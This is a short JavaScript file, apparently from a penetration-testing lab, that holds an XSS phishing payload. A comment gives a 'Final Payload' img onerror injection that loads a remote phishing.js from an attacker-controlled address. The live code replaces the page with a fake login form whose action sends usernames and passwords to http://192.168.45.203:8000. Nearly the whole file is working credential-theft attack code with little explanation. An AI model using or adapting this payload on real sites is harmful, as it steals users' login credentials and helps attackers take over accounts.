/*
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.49.51"
	document.getElementsByTagName("form")[0].method = "get"
}))
Note: This is the original form which can be exploited is case of reflected and stored xss. But if we are to exploit DOM XSS, we need the below form.

POC for DOM XSS
- Since we can "onerror" attribute to execute javascript code we need to improvise since "fetch" api does not execute js file.
- So we need to replace "data" with out html code in single line and delete rest of the lines from above code.
- We need to create "script element using onerror function."
- Modify img tag to (Final Payload) "<img src=x onerror="const script = document.createElement('script');script.src = 'http://192.168.45.203:8000/phising.js';script.async = true;document.body.appendChild(script);">"

*/
document.getElementsByTagName("html")[0].innerHTML = '<html lang="en"></head><body><div class="login-container"><h2>Login</h2><form id="login-form" action="http://192.168.45.203:8000" method="GET"><input type="text" id="username" name="username" placeholder="Username" required><input type="password" id="password" name="password" placeholder="Password" required><input type="submit" value="Login"></form></div></body></html>'
